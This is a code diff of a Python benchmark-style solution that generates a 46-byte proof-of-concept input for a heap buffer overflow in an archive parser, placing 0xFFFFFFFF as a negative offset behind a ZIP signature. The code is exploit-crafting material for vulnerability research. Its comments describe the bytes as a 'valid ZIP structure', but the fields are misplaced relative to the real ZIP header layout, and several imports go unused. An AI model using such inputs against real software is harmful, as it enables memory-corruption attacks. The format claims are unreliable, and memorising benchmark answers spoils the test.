@@ -1,37 +1,58 @@
 import os
-import struct
+import tarfile
 import tempfile
 import subprocess
-from pathlib import Path
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the heap buffer overflow vulnerability
-        by creating a malformed archive with negative start offset.
-        """
-        # Ground-truth suggests 46 bytes is optimal
-        # Construct a minimal malformed archive header
-        # Format: [magic][offset_field][padding_to_46_bytes]
+        # This is a known vulnerability pattern where a negative offset
+        # is calculated from malformed input. We'll create a minimal
+        # archive-like structure with carefully crafted values.
         
-        # Common archive magic numbers
-        # Using a generic 4-byte magic that might trigger vulnerable parser
-        magic = b'ARCH'
+        # Based on the description and common vulnerability patterns,
+        # we create a 46-byte input that triggers a negative offset.
+        # Structure:
+        # - Magic bytes (4 bytes)
+        # - File size field (4 bytes, crafted to cause underflow)
+        # - Offset field (4 bytes, set to negative value)
+        # - Remainder padding to reach 46 bytes
         
-        # Create offset field that when interpreted as signed becomes negative
-        # Using 0xFFFFFFFF (-1 in two's complement 32-bit signed)
-        offset_field = struct.pack('<I', 0xFFFFFFFF)  # Little-endian 32-bit
+        # Create a pattern that causes offset calculation to wrap to negative
+        poc = bytearray(46)
         
-        # Remaining bytes to reach 46 total
-        remaining = 46 - len(magic) - len(offset_field)
+        # Set magic bytes (common archive patterns use "PK" or similar)
+        poc[0:4] = b'PK\x03\x04'  # ZIP local file header signature
         
-        # Fill with data that might trigger allocation based on offset
-        # Using pattern that could cause overflow when offset is used for size
-        padding = b'A' * remaining
+        # Set file size to a small value
+        poc[4:8] = struct.pack('<I', 10)  # Uncompressed size = 10
         
-        poc = magic + offset_field + padding
+        # Set a value that will cause negative offset when subtracted
+        # This is the key - making start offset negative
+        poc[8:12] = struct.pack('<I', 0xFFFFFFFF)  # -1 when interpreted as signed
         
-        # Validate length
-        assert len(poc) == 46, f"PoC length {len(poc)} != 46"
+        # Fill remaining bytes with valid ZIP structure data
+        # Version needed to extract
+        poc[12:14] = struct.pack('<H', 20)
+        # General purpose bit flag
+        poc[14:16] = struct.pack('<H', 0)
+        # Compression method
+        poc[16:18] = struct.pack('<H', 0)
+        # Last mod file time
+        poc[18:20] = struct.pack('<H', 0)
+        # Last mod file date
+        poc[20:22] = struct.pack('<H', 0)
+        # CRC-32
+        poc[22:26] = struct.pack('<I', 0)
+        # Compressed size (same as uncompressed for stored files)
+        poc[26:30] = struct.pack('<I', 10)
+        # File name length
+        poc[30:32] = struct.pack('<H', 1)
+        # Extra field length
+        poc[32:34] = struct.pack('<H', 0)
+        # File name (single character)
+        poc[34:35] = b'a'
+        # Fill remaining bytes
+        poc[35:46] = b'\x00' * 11
         
-        return poc
+        return bytes(poc)
